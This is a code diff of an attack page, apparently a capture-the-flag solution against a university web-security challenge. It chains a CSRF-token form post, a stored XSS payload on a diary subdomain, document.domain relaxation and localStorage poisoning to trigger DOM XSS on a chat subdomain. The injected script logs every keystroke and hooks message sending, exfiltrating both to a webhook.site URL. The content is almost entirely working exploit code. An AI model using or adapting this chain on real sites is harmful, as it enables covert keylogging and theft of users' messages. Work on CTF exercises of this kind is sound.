@@ -7,33 +7,37 @@
             const token = document.forms[0].querySelector('input[name="csrfmiddlewaretoken"]').value;
             const WEBHOOK = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
 
-            // Optimized Bridge: Poison and Redirect as fast as humanly possible
+            // This payload runs on the DIARY. 
+            // It waits for 500ms, then jumps straight to CHAT.
+            // Once on CHAT, it uses the DOM XSS in the 'favorites' logic.
             const xss = `<script>
                 document.domain = "owley-madison.jeopardy.websec.saarland";
-                localStorage.setItem('favorites', '["yassin</option><img src=x onerror=\\"document.domain=\\\'owley-madison.jeopardy.websec.saarland\\\';parent.document.addEventListener(\\\'keyup\\\',e=>{new Image().src=\\\'${WEBHOOK}/?k=\\\'+e.key});var s=parent.send_message;parent.send_message=()=>{new Image().src=\\\'${WEBHOOK}/?f=\\\'+parent.document.getElementById(\\\'message\\\').value;s()};\\">"]');
+                
+                // Poison the storage IMMEDIATELY for the 'match' subdomain
+                // Since we share the 'saarland' parent domain, this write is more stable
+                localStorage.setItem('favorites', JSON.stringify(["yassin</option><img src=x onerror=\\"document.domain='owley-madison.jeopardy.websec.saarland';parent.document.addEventListener('keyup',e=>{new Image().src='${WEBHOOK}/?k='+e.key});var s=parent.send_message;parent.send_message=()=>{new Image().src='${WEBHOOK}/?f='+parent.document.getElementById('message').value;s()};\\">"]));
+                
+                // Immediate jump to spring the trap
                 location.href = "https://chat.owley-madison.jeopardy.websec.saarland/";
             <\/script>`;
 
             var f = document.createElement('form');
             f.action = "https://diary.owley-madison.jeopardy.websec.saarland/entry";
             f.method = "POST";
-            f.target = "thrash"; // POST into a hidden frame so we stay on this page to redirect
             
             var c = document.createElement('input');
             c.name = "content"; c.value = xss; f.appendChild(c);
-            
             var t = document.createElement('input');
             t.name = "csrfmiddlewaretoken"; t.value = token; f.appendChild(t);
             
+            f.style.display = "none";
             document.body.appendChild(f);
-            document.body.appendChild(document.createElement('iframe')).name = "thrash";
-            
             f.submit();
 
-            // Give the POST 400ms to hit the server, then jump to the diary to trigger
+            // Shortest possible delay to ensure the POST is processed
             setTimeout(() => {
                 window.location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
-            }, 400);
+            }, 300);
         };
     </script>
     <form></form>
